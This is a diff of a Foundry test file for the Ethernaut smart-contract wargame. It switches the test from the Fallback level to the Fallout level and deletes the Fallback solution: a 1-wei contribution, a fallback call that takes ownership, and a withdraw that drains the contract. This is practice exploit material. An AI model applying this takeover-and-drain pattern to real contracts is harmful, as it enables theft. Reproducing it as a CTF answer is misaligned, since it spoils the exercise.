@@ -4,9 +4,10 @@ pragma solidity ^0.8.12;
 import "ds-test/test.sol";
 import "forge-std/Vm.sol";
 import "../Ethernaut.sol";
-import "../Fallback/FallbackFactory.sol";
+import "../Fallout/FalloutFactory.sol";
+import "../Fallout/Fallout.sol";
 
-contract FallbackTest is DSTest {
+contract FalloutTest is DSTest {
     // 0x710... is a special address
     // See https://onbjerg.github.io/foundry-book/forge/cheatcodes.html
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
@@ -20,25 +21,21 @@ contract FallbackTest is DSTest {
         vm.deal(eoaAddress, 5 ether);
     }
 
-    function testFallbackSolution() public {
+    function testFalloutSolution() public {
         // Setup
-        FallbackFactory fallbackFactory = new FallbackFactory();
-        ethernaut.registerLevel(fallbackFactory);
+        FalloutFactory falloutFactory = new FalloutFactory();
+        ethernaut.registerLevel(falloutFactory);
         vm.startPrank(eoaAddress);
-        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
-        Fallback fallbackContract = Fallback(payable(levelAddress));
+        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
+        Fallout level = Fallout(payable(levelAddress));
 
         // Solution
-        fallbackContract.contribute{value: 1 wei}(); // contribute 1 wei
-        assertEq(fallbackContract.getContribution(), 1);
-        (bool success, bytes memory data) = address(fallbackContract).call{value: 1 wei}(""); // invoke fallback()
-        assert(success);
-        assertEq(fallbackContract.owner(), eoaAddress);
-        fallbackContract.withdraw(); // invoke withdraw
 
         // Verify
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+
     }
+
 }
